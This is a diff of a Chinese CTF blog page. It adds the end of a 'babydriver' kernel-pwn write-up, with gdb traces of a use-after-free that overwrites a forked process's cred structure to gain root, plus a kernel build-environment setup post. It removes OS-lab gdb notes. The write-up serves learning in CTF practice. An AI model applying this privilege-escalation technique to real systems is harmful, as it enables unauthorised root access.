+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">/ $ ./tmp/exploit </span><br><span class="line">[   33.920853] device open</span><br><span class="line">[   33.921335] device open</span><br><span class="line">[   33.921826] alloc done</span><br><span class="line">[   33.922365] device release</span><br><span class="line">[+] root now.</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">/ # </span><br></pre></td></tr></table></figure>
+
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先提取带符号的源码vmlinux；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
+
+<p>可以先以root身份执行<code>boot.sh</code>，找到.text段的地址；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sys/modules/core/section/.text</span><br><span class="line">或者</span><br><span class="line">/proc/modules</span><br></pre></td></tr></table></figure>
+
+<p>这里是<code>/proc/modules</code>，可以得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/modules </span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>
+
+<p>启动gdb；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux -q</span><br></pre></td></tr></table></figure>
+
+<p>导入符号表；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>
+
+<p>可以得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add symbol table from file &quot;core/lib/modules/4.4.72/babydriver.ko&quot; at</span><br><span class="line">	.text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from core/lib/modules/4.4.72/babydriver.ko...done.</span><br></pre></td></tr></table></figure>
+
+<p>远程调试设置，在<code>boot.sh</code>中加入调试设置；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::1234</span><br><span class="line">或者</span><br><span class="line">-s</span><br></pre></td></tr></table></figure>
+
+<p>这时候就可以一下断点了；</p>
+<p>这里在以下三个位置分别设置断点；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b babyopen</span><br><span class="line">Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28.</span><br><span class="line">pwndbg&gt; b babyioctl</span><br><span class="line">Breakpoint 2 at 0xffffffffc0000080: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 56.</span><br><span class="line">pwndbg&gt; b babywrite</span><br><span class="line">Breakpoint 3 at 0xffffffffc00000f0: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 48.</span><br></pre></td></tr></table></figure>
+
+<p>连接qemu；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>接着放程序通过；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
+
+<p>在qemu中执行exploit程序，来观察调用的情况；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./tmp/exploit </span><br><span class="line">[  355.326009] device open</span><br></pre></td></tr></table></figure>
+
+<p>可以看到程序在babyopen处断下；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► 0xffffffffc0000030 &lt;babyopen&gt;       nop    </span><br><span class="line">  0xffffffffc0000035 &lt;babyopen+5&gt;     push   rbp</span><br><span class="line">  0xffffffffc0000036 &lt;babyopen+6&gt;     mov    rdi, qword ptr [rip - 0x3de3bc0d]</span><br><span class="line">  0xffffffffc000003d &lt;babyopen+13&gt;    mov    edx, 0x40</span><br><span class="line">  0xffffffffc0000042 &lt;babyopen+18&gt;    mov    esi, 0x24000c0</span><br><span class="line">  0xffffffffc0000047 &lt;babyopen+23&gt;    mov    rbp, rsp</span><br><span class="line">  0xffffffffc000004a &lt;babyopen+26&gt;    call   0xffffffff811ea180</span><br></pre></td></tr></table></figure>
+
+<p>当执行到<code>&lt;babyopen+38&gt;</code>时，查看对应指针地址的内容：</p>
+<p><code>babydev_struct.dev_buf</code>的地址为<code>0xffffffffc00024d0</code>，<code>babydev_struct.dev_buf_len</code>的地址为<code>0xffffffffc00024d8</code>；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffffc000004f &lt;babyopen+31&gt;    mov    rdi, -0x3fffefcc</span><br><span class="line"> ► 0xffffffffc0000056 &lt;babyopen+38&gt;    mov    qword ptr [rip + 0x2473], rax</span><br><span class="line">   0xffffffffc000005d &lt;babyopen+45&gt;    mov    qword ptr [rip + 0x2470], 0x40</span><br><span class="line">   0xffffffffc0000068 &lt;babyopen+56&gt;    call   0xffffffff8118b077</span><br><span class="line">=====================================================================</span><br><span class="line">pwndbg&gt; x/10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时还没有打开，因此都为<code>0</code>；</p>
+<p>执行完后，结构体变量<code>dev_buf</code>指向了缓冲区地址<code>0xffff880003d1ea00</code>，而<code>babydev_struct.dev_buf_len</code>为<code>0x40</code>；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0xffff880003d1ea00	0x0000000000000040</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>缓冲区地址<code>0xffff880003d1ea00</code>的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0xffff880003d1ea00</span><br><span class="line">0xffff880003d1ea00:	0xffff880003d1ea80	0xffff880003d36190</span><br><span class="line">0xffff880003d1ea10:	0xdead000000000100	0xdead000000000200</span><br><span class="line">0xffff880003d1ea20:	0xffff880003d1ede0	0x0000000000000000</span><br><span class="line">0xffff880003d1ea30:	0x0000000000000000	0x0000000000001450</span><br><span class="line">0xffff880003d1ea40:	0xffff880003d1ec00	0xffff880003d360a0</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>c</code>，让程序到第二次调用<code>babyopen</code>时断下，并如第一次一样查看dev_buf指针的指向地址，以及查看指向地址buf中的内容；</p>
+<p>会发现，<code>dev_buf</code>的地址仍然是<code>0xffffffffc00024d0</code>，只是buffer分配了新的值；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0xffff880003d1ea80	0x0000000000000040</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>c</code>，让程序到执行<code>babyioctl</code>时断下，执行<code>ni</code>，并在即将赋值时停下；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0xffffffffc00000ae &lt;babyioctl+46&gt;    mov    rdi, -0x3fffefbf</span><br><span class="line">► 0xffffffffc00000b5 &lt;babyioctl+53&gt;    mov    qword ptr [rip + 0x2414], rax</span><br><span class="line">  0xffffffffc00000bc &lt;babyioctl+60&gt;    mov    qword ptr [rip + 0x2415], rbx</span><br><span class="line">  0xffffffffc00000c3 &lt;babyioctl+67&gt;    call   0xffffffff8118b077</span><br></pre></td></tr></table></figure>
+
+<p>在结构体长度赋值之前，查看一下<code>dev_buf</code>和<code>dev_buf_len</code>；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0xffff880003d1ea80	0x0000000000000040</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>执行结束后再次查看；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0xffff880003d70540	0x00000000000000a8</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，buffer的地址又重新分配了，而<code>dev_buf_len</code>被修改为了<code>cred</code>结构体的大小；</p>
+<p>执行<code>c</code>，程序执行到<code>babywrite</code>时停下，此时<code>fork</code>的新进程的<code>cred</code>结构体已经被放到了buffer处，也就是<code>0xffff880003d70540</code>处；</p>
+<p>可以瞅一眼；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0xffff880003d70540</span><br><span class="line">0xffff880003d70540:	0x000003e800000002	0x000003e8000003e8</span><br><span class="line">0xffff880003d70550:	0x000003e8000003e8	0x000003e8000003e8</span><br><span class="line">0xffff880003d70560:	0x00000000000003e8	0x0000000000000000</span><br><span class="line">0xffff880003d70570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880003d70580:	0x0000003fffffffff	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到很多<code>0x3e8</code>，其实这就是<code>1000</code>，代表了用户的权限；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p 0x3e8</span><br><span class="line">$1 = 1000</span><br></pre></td></tr></table></figure>
+
+<p>在执行完<code>babywrite</code>后，再看一下该地址的内容；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">after this -&gt;  0xffffffffc0000119 &lt;babywrite+41&gt;    call   0xffffffff813e6520</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0xffff880003d70540</span><br><span class="line">0xffff880003d70540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880003d70550:	0x0000000000000000	0x000003e800000000</span><br><span class="line">0xffff880003d70560:	0x00000000000003e8	0x0000000000000000</span><br><span class="line">0xffff880003d70570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880003d70580:	0x0000003fffffffff	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到前0x28bytes被修改为0；</p>
+<p>执行c，达到提权效果；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
+  <article id="post-Environment" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/kernel-pwn/knowledge/Environment/">Environment</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-12T00:47:06.000Z" itemprop="datePublished">2021年11月12日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/kernel-pwn/knowledge/Environment/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>内核版本：4.4.72</p>
+<p>busybox版本：1.32.1</p>
+<p>gcc版本：5.4.0</p>
+<p>虚拟机操作系统：ubuntu16.04 64位</p>
+<h2 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc qemu qemu-system</span><br><span class="line">sudo apt-get install bison flex libncurses5-dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="gcc版本切换"><a href="#gcc版本切换" class="headerlink" title="gcc版本切换"></a>gcc版本切换</h2><p>看情况切换gcc；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y gcc-x.x			# x.x为版本</span><br><span class="line">sudo apt-get install -y g++-x.x</span><br><span class="line"># 重新建立软连接</span><br><span class="line">cd /usr/bin    							#进入/usr/bin文件夹下</span><br><span class="line">sudo rm -r gcc  						#移除之前的软连接</span><br><span class="line">sudo ln -sf gcc-x.x gcc 				#建立gcc4.7的软连接</span><br><span class="line">sudo rm -r g++  #同gcc</span><br><span class="line">sudo ln -sf g++-x.x g++</span><br></pre></td></tr></table></figure>
+
+<h2 id="内核源码下载与编译"><a href="#内核源码下载与编译" class="headerlink" title="内核源码下载与编译"></a>内核源码下载与编译</h2><p>清华库<a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.72.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>解压</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf linux-4.4.72.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd linux-4.4.72</span><br><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make all</span><br><span class="line">make modules</span><br></pre></td></tr></table></figure>
+
+<p>未完待续…</p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
   <article id="post-basic-knowledge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
@@ -1327,171 +1612,6 @@
 </article>
 
 
-  <article id="post-challenge2-3-diff-asm" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/OS/lab1/challenge2-qemu-gdb/challenge2-3-diff-asm/">challenge2.3:diff_asm</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-11T08:13:35.000Z" itemprop="datePublished">2021年11月11日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/OS/">OS</a> > <a class="article-category-link" href="/categories/OS/lab1/">lab1</a> > <a class="article-category-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a>
-  </div>
-
-      
-      
-<a href="/OS/lab1/challenge2-qemu-gdb/challenge2-3-diff-asm/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="challenge2-3-diff-asm"><a href="#challenge2-3-diff-asm" class="headerlink" title="challenge2.3:diff asm"></a>challenge2.3:diff asm</h1><p>从<code>0x7c00</code>开始跟踪代码运行,将单步跟踪反汇编得到的代码与<code>bootasm.S</code>和 <code>bootblock.asm</code>进行比较。</p>
-<p>设置gdbinit，使得调试时能够强制反汇编每一个断点的汇编代码；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file bin/kernel</span><br><span class="line">target remote :1234</span><br><span class="line">break *0x7c00</span><br><span class="line">define hook-stop</span><br><span class="line">x/i $pc</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>在make debug后，可以看到断点停留在0x7c00，使用ni观察并记录汇编代码；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">reakpoint 1, 0x00007c00 in ?? ()</span><br><span class="line">(gdb) ni</span><br><span class="line">=&gt; 0x7c01:      cld</span><br><span class="line">0x00007c01 in ?? ()</span><br><span class="line">=&gt; 0x7c02:      xor    %eax,%eax</span><br><span class="line">0x00007c02 in ?? ()</span><br><span class="line">=&gt; 0x7c04:      mov    %eax,%ds</span><br><span class="line">0x00007c04 in ?? ()</span><br><span class="line">=&gt; 0x7c06:      mov    %eax,%es</span><br><span class="line">0x00007c06 in ?? ()</span><br><span class="line">=&gt; 0x7c08:      mov    %eax,%ss</span><br><span class="line">0x00007c08 in ?? ()</span><br><span class="line">=&gt; 0x7c0a:      in     $0x64,%al</span><br><span class="line">0x00007c0a in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>现在去找到<code>bootasm.S</code>文件，进行对比；</p>
-<p><code>bootasm.S</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">.code16                                             # Assemble for 16-bit mode</span><br><span class="line">    cli                                             # Disable interrupts</span><br><span class="line">    cld                                             # String operations increment</span><br><span class="line"></span><br><span class="line">    # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">    movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>几乎没有差异；</p>
-<p>同样，在bootblock.asm中：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00007c00 &lt;start&gt;:</span><br><span class="line"></span><br><span class="line"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">.code16                                             # Assemble for 16-bit mode</span><br><span class="line">    cli                                             # Disable interrupts</span><br><span class="line">    7c00:  fa                     cli    </span><br><span class="line">    cld                                             # String operations increment</span><br><span class="line">    7c01:  fc                     cld    </span><br><span class="line"></span><br><span class="line">    # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">    7c02:  31 c0                  xor    %eax,%eax</span><br><span class="line">    movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    7c04:  8e d8                  mov    %eax,%ds</span><br><span class="line">    movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    7c06:  8e c0                  mov    %eax,%es</span><br><span class="line">    movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line">    7c08:  8e d0                  mov    %eax,%ss</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>几乎没有差异；</p>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
-  <article id="post-challenge2-2-break-at-0x7c00" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/OS/lab1/challenge2-qemu-gdb/challenge2-2-break-at-0x7c00/">challenge2.2:break_at_0x7c00</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-11T08:13:21.000Z" itemprop="datePublished">2021年11月11日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/OS/">OS</a> > <a class="article-category-link" href="/categories/OS/lab1/">lab1</a> > <a class="article-category-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a>
-  </div>
-
-      
-      
-<a href="/OS/lab1/challenge2-qemu-gdb/challenge2-2-break-at-0x7c00/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="challenge2-2-break-at-0x7c00"><a href="#challenge2-2-break-at-0x7c00" class="headerlink" title="challenge2.2:break at 0x7c00"></a>challenge2.2:break at 0x7c00</h1><p>在初始化位置<code>0x7c00</code>设置实地址断点,测试断点正常。</p>
-<p>同理，直接gdbinit修改断点为<code>0x7c00</code>即可；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat tools/gdbinit</span><br><span class="line"></span><br><span class="line">file bin/kernel</span><br><span class="line">target remote :1234</span><br><span class="line">break *0x7c00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>执行make debug，看看断点是否正确，能否正常调试；</p>
-<p>调试信息如下：</p>
